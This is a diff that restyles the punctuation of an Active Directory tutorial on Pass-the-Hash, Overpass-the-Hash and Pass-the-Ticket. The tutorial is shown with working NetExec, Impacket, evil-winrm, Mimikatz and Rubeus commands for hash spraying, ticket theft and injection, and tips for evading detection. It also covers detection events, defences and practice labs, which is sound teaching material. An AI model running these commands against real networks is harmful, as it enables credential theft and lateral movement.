@@ -25,7 +25,7 @@ Every Pass-the-X attack is really just *abusing how authentication works*. So be
 
 ### NTLM in one minute
 
-NTLM is a **challenge-response** protocol. The important part for us: your password is never sent over the wire, and the server never checks your *password* directly. It checks your **NT hash** — the MD4 of your password (no salt, which is why hashes are so reusable).
+NTLM is a **challenge-response** protocol. The important part for us: your password is never sent over the wire, and the server never checks your *password* directly. It checks your **NT hash**, the MD4 of your password (no salt, which is why hashes are so reusable).
 
 The flow, simplified:
 
@@ -34,7 +34,7 @@ The flow, simplified:
 3. Client encrypts the challenge using **Alice's NT hash** and sends the result back.
 4. Server (or the DC) verifies it.
 
-Notice what's missing: **the plaintext password is never needed.** If you hold Alice's NT hash, you can complete this exchange. That's Pass-the-Hash in a nutshell — but we'll get there.
+Notice what's missing: **the plaintext password is never needed.** If you hold Alice's NT hash, you can complete this exchange. That's Pass-the-Hash in a nutshell, but we'll get there.
 
 ### Kerberos in two minutes
 
@@ -42,15 +42,15 @@ Kerberos is the default in a domain and works with **tickets** instead of challe
 
 The flow, simplified:
 
-1. **AS-REQ / AS-REP** — The client proves who it is (by encrypting a timestamp with its key, which is *derived from the password*) and receives a **TGT** (Ticket-Granting Ticket). The TGT is your "I'm authenticated" pass, encrypted with the `krbtgt` account's secret so only the DC can read it.
-2. **TGS-REQ / TGS-REP** — The client presents the TGT to ask for a **service ticket (TGS)** for a specific service (an SPN, like `cifs/fileserver`).
-3. **AP-REQ** — The client presents that service ticket to the service and gets access.
+1. **AS-REQ / AS-REP**: The client proves who it is (by encrypting a timestamp with its key, which is *derived from the password*) and receives a **TGT** (Ticket-Granting Ticket). The TGT is your "I'm authenticated" pass, encrypted with the `krbtgt` account's secret so only the DC can read it.
+2. **TGS-REQ / TGS-REP**: The client presents the TGT to ask for a **service ticket (TGS)** for a specific service (an SPN, like `cifs/fileserver`).
+3. **AP-REQ**: The client presents that service ticket to the service and gets access.
 
-The user's Kerberos key can be their **RC4 key (which is literally their NT hash)** or an **AES128/AES256 key** derived from the password plus a salt. Remember that RC4-key = NT-hash detail — it's why one stolen hash unlocks both NTLM *and* Kerberos.
+The user's Kerberos key can be their **RC4 key (which is literally their NT hash)** or an **AES128/AES256 key** derived from the password plus a salt. Remember that RC4-key = NT-hash detail, it's why one stolen hash unlocks both NTLM *and* Kerberos.
 
 ### Where the secrets live
 
-All these juicy secrets — NT hashes, Kerberos tickets, sometimes cached credentials — sit in the memory of the **LSASS** process (`lsass.exe`) on a machine, plus the local **SAM** database and the **NTDS.dit** file on a DC. Tools like **Mimikatz** read them straight out of LSASS memory. Getting local admin / SYSTEM on a box is usually what lets you dump these in the first place — Pass-the-X is what you do *after* you've grabbed them.
+All these juicy secrets: NT hashes, Kerberos tickets, sometimes cached credentials, sit in the memory of the **LSASS** process (`lsass.exe`) on a machine, plus the local **SAM** database and the **NTDS.dit** file on a DC. Tools like **Mimikatz** read them straight out of LSASS memory. Getting local admin / SYSTEM on a box is usually what lets you dump these in the first place, Pass-the-X is what you do *after* you've grabbed them.
 
 ## The family at a glance
 
@@ -64,24 +64,24 @@ They overlap a lot. The rule of thumb: **hashes feed NTLM (PtH) or get upgraded 
 
 ## Pass-the-Hash (PtH)
 
-**The idea:** You have a user's NT hash. Since NTLM only ever needed the hash, you authenticate as that user — no cracking, no plaintext.
+**The idea:** You have a user's NT hash. Since NTLM only ever needed the hash, you authenticate as that user, no cracking, no plaintext.
 
 **When it shines:** Local admin accounts reused across machines, or a domain account whose hash you dumped from one box that also has rights elsewhere. Classic lateral movement.
 
 You'll often see hashes written as `LM:NT`. Modern systems don't store LM hashes, so the LM half is usually the "empty" value `aad3b435b51404eeaad3b435b51404ee`. You can pass the full `LM:NT` pair or just the NT half.
 
 ```bash
-# NetExec — spray a hash across a host (or a whole subnet)
+# NetExec: spray a hash across a host (or a whole subnet)
 nxc smb 192.168.56.10 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:<NThash>
 
 # Just the NT hash works too
 nxc smb 192.168.56.0/24 -u Administrator -H <NThash> --local-auth
 
-# Impacket — get a shell
+# Impacket: get a shell
 psexec.py -hashes :<NThash> CORP/Administrator@192.168.56.10
 wmiexec.py -hashes :<NThash> CORP/Administrator@192.168.56.10   # quieter than psexec
 
-# evil-winrm — if WinRM (5985) is open
+# evil-winrm: if WinRM (5985) is open
 evil-winrm -i 192.168.56.10 -u Administrator -H <NThash>
 ```
 
@@ -104,7 +104,7 @@ sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<NThash> /run:cmd.exe
 2. Requesting a TGT with **RC4** (the NT hash) can trip "encryption downgrade" detections. Using the **AES256 key** looks like normal traffic and is much stealthier.
 
 ```powershell
-# Rubeus (Windows) — request a TGT with the NT hash (RC4) and inject it
+# Rubeus (Windows): request a TGT with the NT hash (RC4) and inject it
 Rubeus.exe asktgt /user:jdoe /domain:corp.local /rc4:<NThash> /ptt
 
 # Stealthier: use the AES256 key instead of RC4
@@ -112,13 +112,13 @@ Rubeus.exe asktgt /user:jdoe /domain:corp.local /aes256:<aes256key> /ptt
 ```
 
 ```bash
-# Impacket (Linux) — same idea, saves a ccache file
+# Impacket (Linux): same idea, saves a ccache file
 getTGT.py -hashes :<NThash> corp.local/jdoe
 export KRB5CCNAME=jdoe.ccache
 psexec.py -k -no-pass corp.local/jdoe@target.corp.local
 ```
 
-The `/ptt` flag ("pass the ticket") tells Rubeus to inject the new TGT straight into your current session — which is a nice segue.
+The `/ptt` flag ("pass the ticket") tells Rubeus to inject the new TGT straight into your current session, which is a nice segue.
 
 ## Pass-the-Ticket (PtT)
 
@@ -126,19 +126,19 @@ The `/ptt` flag ("pass the ticket") tells Rubeus to inject the new TGT straight 
 
 **When it shines:** A privileged user has logged into a box you control and left tickets in LSASS. Grab them, become them.
 
-**Step 1 — dump tickets:**
+**Step 1: dump tickets:**
 
 ```
-# Mimikatz — export every ticket in memory to .kirbi files
+# Mimikatz: export every ticket in memory to .kirbi files
 sekurlsa::tickets /export
 ```
 
 ```powershell
-# Rubeus — dump tickets as base64
+# Rubeus: dump tickets as base64
 Rubeus.exe dump /nowrap
 ```
 
-**Step 2 — inject and use:**
+**Step 2: inject and use:**
 
 ```
 # Mimikatz
@@ -164,7 +164,7 @@ You'll hear "Golden Ticket" and "Silver Ticket" in the same breath as these. Her
 - **Pass-the-Ticket** = *replaying a real ticket* you stole.
 - **Golden / Silver tickets** = *forging a fake ticket* from a stolen key, then passing it (using the same PtT injection).
 
-A **Golden Ticket** is a forged TGT signed with the domain's `krbtgt` hash — game over for the domain. A **Silver Ticket** is a forged service ticket signed with a single service account's key — access to one service, but very quiet since the DC never sees it. Both are *forgery* attacks that happen to use Pass-the-Ticket as their delivery mechanism. Worth their own post — file them under "next steps."
+A **Golden Ticket** is a forged TGT signed with the domain's `krbtgt` hash: game over for the domain. A **Silver Ticket** is a forged service ticket signed with a single service account's key: access to one service, but very quiet since the DC never sees it. Both are *forgery* attacks that happen to use Pass-the-Ticket as their delivery mechanism. Worth their own post: file them under "next steps."
 
 ## Bonus: Pass-the-Certificate
 
@@ -185,37 +185,37 @@ This is the payoff for a lot of the ESC1–ESC8 certificate-template abuses. Def
 
 Detection mostly comes down to watching Windows Security logs for the *shape* of these attacks:
 
-- **4624** (logon) — watch for **Logon Type 9** (NewCredentials) paired with a `seclogo` process, a classic `sekurlsa::pth` fingerprint.
-- **4768 / 4769** (TGT and service-ticket requests) — flag **RC4 encryption (type 0x17)** where your environment should be using AES. Encryption downgrades are a strong signal for Overpass-the-Hash.
-- **4776** (NTLM validation) — spikes or NTLM auth from hosts that shouldn't be using it.
-- **Behavioral tells** — a ticket used from a *different* machine than the one it was issued to, or a user authenticating to hosts they never normally touch.
+- **4624** (logon): watch for **Logon Type 9** (NewCredentials) paired with a `seclogo` process, a classic `sekurlsa::pth` fingerprint.
+- **4768 / 4769** (TGT and service-ticket requests): flag **RC4 encryption (type 0x17)** where your environment should be using AES. Encryption downgrades are a strong signal for Overpass-the-Hash.
+- **4776** (NTLM validation): spikes or NTLM auth from hosts that shouldn't be using it.
+- **Behavioral tells**: a ticket used from a *different* machine than the one it was issued to, or a user authenticating to hosts they never normally touch.
 
 A good EDR plus something like a SIEM correlation rule catches most of the noisy variants.
 
 ## How defenders stop these
 
-- **Credential Guard** — virtualization-based protection that keeps LSASS secrets out of reach of Mimikatz.
-- **LSASS as a Protected Process (RunAsPPL)** — raises the bar for memory dumping.
-- **Protected Users group** — for members, no NTLM, no RC4, no delegation, and short TGT lifetimes. Kills a lot of these attacks outright for your privileged accounts.
-- **LAPS** — unique, rotating local admin passwords so one dumped hash doesn't open every machine (kills lateral PtH).
-- **Tiered admin model** — don't let Domain Admins log into workstations where their tickets can be harvested.
-- **Enforce AES, disable RC4** — removes the RC4/NT-hash shortcut for Kerberos.
-- **Rotate the `krbtgt` password** (twice) periodically — limits Golden Ticket lifespan.
+- **Credential Guard**: virtualization-based protection that keeps LSASS secrets out of reach of Mimikatz.
+- **LSASS as a Protected Process (RunAsPPL)**: raises the bar for memory dumping.
+- **Protected Users group**: for members, no NTLM, no RC4, no delegation, and short TGT lifetimes. Kills a lot of these attacks outright for your privileged accounts.
+- **LAPS**: unique, rotating local admin passwords so one dumped hash doesn't open every machine (kills lateral PtH).
+- **Tiered admin model**: don't let Domain Admins log into workstations where their tickets can be harvested.
+- **Enforce AES, disable RC4**: removes the RC4/NT-hash shortcut for Kerberos.
+- **Rotate the `krbtgt` password** (twice) periodically: limits Golden Ticket lifespan.
 - **Disable NTLM** where you can.
 
 ## Practice safely
 
 You need a lab. Some solid options:
 
-- **[GOAD](https://github.com/Orange-Cyberparis/GOAD)** (Game of Active Directory) — a deliberately vulnerable multi-domain forest, purpose-built for exactly these attacks.
-- **TCM Security's Practical Ethical Hacking / PNPT track** — walks the AD attack chain end to end.
+- **[GOAD](https://github.com/Orange-Cyberparis/GOAD)** (Game of Active Directory): a deliberately vulnerable multi-domain forest, purpose-built for exactly these attacks.
+- **TCM Security's Practical Ethical Hacking / PNPT track**: walks the AD attack chain end to end.
 - **Hack The Box** Pro Labs (Dante, and the AD-focused labs) and various retired machines.
 
 Start by dumping a hash with Mimikatz in your lab, then work through PtH → Overpass → PtT with the same account so you *feel* how they relate.
 
 ## Key takeaways
 
-- AD authentication doesn't always need a password — a **hash** or a **ticket** is often enough.
+- AD authentication doesn't always need a password: a **hash** or a **ticket** is often enough.
 - **Pass-the-Hash** abuses NTLM; **Overpass-the-Hash / Pass-the-Key** upgrades a hash into Kerberos; **Pass-the-Ticket** replays a stolen ticket.
 - Prefer **AES over RC4** when you want to stay quiet.
 - **Golden/Silver tickets** are *forgery* attacks that ride on Pass-the-Ticket.
